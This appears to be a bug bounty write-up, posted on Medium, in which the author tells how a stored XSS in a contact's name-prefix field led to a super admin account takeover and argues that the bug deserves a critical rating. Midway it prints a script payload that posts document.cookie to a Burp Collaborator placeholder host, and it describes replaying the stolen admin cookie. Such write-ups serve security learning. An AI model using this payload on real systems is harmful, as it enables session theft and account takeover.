# Stored XSS Critical or NOT?

- **Source URL:** https://medium.com/@mrro0o0tt/stored-xss-critical-or-not-da9eb9b19029?source=rss------bug_bounty-5
- **Fetched from:** https://medium.com/feed/@mrro0o0tt
- **Fetched:** 2026-11-27
- **Channel:** @dailybountywriteup
- **Telegram message:**  (id 7648)
- **Method:** medium-rss-content readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
Sorry for killing your time! You are not gonna getting any valuable insights here! I am very bad at writing! But if you have some time read it.

Last Month I discovered a Stored XSS on a platform, let’s call it factory.com

So they accepted and thanked me for this bug! They Offer me also a minimum amount of bounty as well! But the problem? They said they didn’t find it as a Critical one!

I did not add Full POC of Chaining it for ATO!

I should had maybe! So My HACKER Heart gets hurt and I fired up my machine and as they fixed that bug so I started looking for another XSS.

Finally within 10 mins I got another!

And this time I got it on Prefix Field of Name!!

Then again as usual I always love to find Impact, then I think like Attacker and okay got that.

I created a contacts as a project manager and add malicious payload on vulnerable field.

payload: \<script>

fetch(‘[https://BURP-COLLABORATOR-SUBDOMAIN'](https://BURP-COLLABORATOR-SUBDOMAIN'), {

method: ‘POST’,

mode: ‘no-cors’,

body:document.cookie

});

\</script>

Do not Just copy & use it! Change the BURP Collaborator link!

Then when Super Admin visits the Contacts list endpoints, My Burp Collaborator client fired up with HTTP req. And yes you are right, what you are thinking — Session Cookie!

Then as a project manager I reload my dashboard and intercept with burpsuite, change the cookie with ADMIN’s cookie then BOOOMMM!!!

Logged in as a SUPER ADMIN!!! I think it is critical! Because I can takeover Admin account!!

SO, This is what Real Attack I performed! If they still not treat it as a critical then they should read & learn about Security! BAD Luck to me!!!

I am not GOOD Hacker, but trying to be !!
